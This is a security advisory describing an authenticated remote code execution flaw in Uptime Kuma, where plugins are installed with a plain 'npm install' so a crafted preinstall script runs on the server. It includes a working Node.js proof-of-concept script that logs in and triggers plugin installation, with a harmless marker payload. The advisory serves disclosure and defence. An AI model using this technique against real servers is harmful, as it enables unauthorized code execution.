## Description

### Summary

Installation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.

### Details

Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.

After downloading a plugin, it's installed by calling `npm install` in the installation directory of the plugin:

[uptime-kuma/server/plugins-manager.js](https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216)

Lines 210 to 216
in
[8c60e90](/louislam/uptime-kuma/commit/8c60e902e1c76ecbbd1b0423b07ce615341cb850)

|  | let result = childProcess.spawnSync("npm", [ "install" ], { |
| --- | --- |
|  | cwd: this.pluginDir, |
|  | env: { |
|  | ...process.env, |
|  | PLAYWRIGHT\_BROWSERS\_PATH: "../../browsers", // Special handling for read-browser-monitor |
|  | } |
|  | }); |

Because the plugin is not validated against the official list of plugins or installed with `npm install --ignore-scripts`, a maliciously crafted plugin taking advantage of [npm scripts](https://docs.npmjs.com/cli/v9/using-npm/scripts) can gain remote code execution.

### PoC

In the PoC below, the plugin at <https://github.com/n-thumann/npm-install-script-poc> will be installed. It only consists of an empty `index.js` and a `package.json` containing the script: `"preinstall": "echo \"Malicious code could have been executed as user $(whoami)\" > /tmp/poc"`. This will be executed when installing the plugin.

1. Start Uptime Kuma: `docker run -d -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1`
2. Create a user using the Uptime Kuma web interface, e.g. user `admin` with password `admin123`
3. Confirm that the PoC file to be created doesn't exist yet:

```
➜  ~ docker exec -it uptime-kuma cat /tmp/poc
cat: /tmp/poc: No such file or directory

```

4. Create file `poc.js` with the following content:

```
SERVER = "ws://localhost:3001";
USERNAME = "admin";
PASSWORD = "admin123";

const { io } = require("socket.io-client");
const socket = io(SERVER);
const repo = "https://github.com/n-thumann/npm-install-script-poc";
const name = "npm-install-script-poc";

socket.emit(
  "login",
  { username: USERNAME, password: PASSWORD, token: "" },
  (res) => {
    if (res.ok !== true) return console.log("Login failed");

    console.log("Login successful");
    socket.emit("installPlugin", repo, name, () => {
      console.log("Done");
      socket.close();
    });
  }
);

```

5. Install `socket.io-client`: `npm install socket.io-client`
6. Run the script: `node poc.js`:

```
# node poc.js
Login successful
Done

```

7. The PoC file has been created:

```
➜  ~ docker exec -it uptime-kuma cat /tmp/poc
Malicious code could have been executed as user root

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
